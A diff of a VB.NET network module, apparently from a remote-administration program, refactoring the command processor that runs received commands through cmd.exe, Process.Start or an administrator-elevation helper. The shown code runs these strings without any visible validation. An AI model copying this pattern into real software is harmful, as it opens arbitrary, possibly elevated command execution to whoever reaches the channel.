@@ -530,22 +530,25 @@ Namespace Network
                     cmdSetType = 4
                     Return "Default command processor changed to 'own' in '" & MyCommandProcessor & "'"
                 Else
-                    If cmdSetType = 1 Then
-                        Process.Start("cmd.exe", command)
-                        Return "Starting cmd under '" & command & "' argument..."
-                    ElseIf cmdSetType = 2 Then
-                        Process.Start(command)
-                        Return "Starting '" & command & "'..."
-                    ElseIf cmdSetType = 3 Then
-                        Dim args() As String = command.Split(" ")
-                        Dim comandoAux As String = Nothing
-                        For i As Integer = 1 To args.Count - 1
-                            comandoAux &= " " & args(i)
-                        Next
-                        Return Boro_Get.BORO_GET_ADMIN(args(0) & " True " & comandoAux.TrimStart())
-                    ElseIf cmdSetType = 4 Then
-                        Return AnotherCommandProcessor(command)
-                    End If
+                    Select Case cmdSetType
+                        Case 1
+                            Process.Start("cmd.exe", "/c " & command)
+                            Return "Starting cmd under '" & command & "' argument..."
+                        Case 2
+                            Process.Start(command)
+                            Return "Starting '" & command & "'..."
+                        Case 3
+                            Dim args() As String = command.Split(" ")
+                            Dim comandoAux As String = Nothing
+                            For i As Integer = 1 To args.Count - 1
+                                comandoAux &= " " & args(i)
+                            Next
+                            Return Boro_Get.BORO_GET_ADMIN(args(0) & " True " & comandoAux.TrimStart())
+                        Case 4
+                            Return AnotherCommandProcessor(command)
+                        Case Else
+                            Return "Can't do that!"
+                    End Select
                 End If
             Catch ex As Exception
                 AddToLog("ProccessCommand@Network", "Error: " & ex.Message, True)
